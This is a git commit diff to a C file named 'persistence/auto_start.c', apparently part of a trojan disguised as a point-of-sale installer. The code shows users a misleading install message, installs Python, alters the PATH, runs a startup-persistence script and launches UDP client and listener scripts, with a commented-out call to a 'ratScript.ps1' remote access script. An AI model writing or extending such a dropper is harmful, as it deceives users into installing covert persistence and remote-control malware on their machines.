331be8bcdc89ea5d2e5516532b3c3074526bf7e8
STUPID-AF-CAT <geddy@waveville.net>
2020-01-30 10:31:15 -0600

    Had to change POS_installer.exe

--- persistence/auto_start.c
+++ persistence/auto_start.c
@@ -4,10 +4,10 @@
 
 int main()
 {
-    printf("Installing now, please enter your password when prompted.\n");
+    printf("Installing now, please install python to run the POS.\n");
     system("start python-3.8.1.exe\n");
-    system("runas /savecred /user:IEUser setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
-    system("runas /user:IEUser \"persist.exe\"\n");
+    system("setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
+    system("python add_startup.py");
     system("python ./UDP_Connection/client.py\n");
     system("python ./UDP_Connection/clientlistener.py\n");
     //system("%homepath%\\documents\\ourFolder\\ratScript.ps1");
